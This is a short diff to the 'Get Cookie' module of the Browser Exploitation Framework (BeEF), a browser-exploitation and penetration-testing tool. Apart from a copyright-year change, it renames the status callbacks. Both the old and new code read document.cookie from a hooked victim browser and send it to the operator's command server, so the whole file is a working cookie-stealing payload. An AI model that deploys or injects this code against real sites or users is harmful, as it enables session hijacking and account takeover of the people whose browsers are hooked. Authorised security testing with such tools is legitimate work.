@@ -1,14 +1,14 @@
 //
-// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
+// Copyright (c) 2006-2026Wade Alcorn - wade@bindshell.net
 // Browser Exploitation Framework (BeEF) - https://beefproject.com
 // See the file 'doc/COPYING' for copying permission
 //
 beef.execute(function() {
 try {
-      beef.net.send("<%= @command_url %>", <%= @command_id %>, 'cookie='+document.cookie, beef.are.status_success());
+      beef.net.send("<%= @command_url %>", <%= @command_id %>, 'cookie='+document.cookie, beef.status.success());
       beef.debug("[Get Cookie] Cookie captured: "+document.cookie);
 }catch(e){
-      beef.net.send("<%= @command_url %>", <%= @command_id %>, 'cookie='+document.cookie, beef.are.status_error());
+      beef.net.send("<%= @command_url %>", <%= @command_id %>, 'cookie='+document.cookie, beef.status.error());
       beef.debug("[Get Cookie] Error");
 }
 });
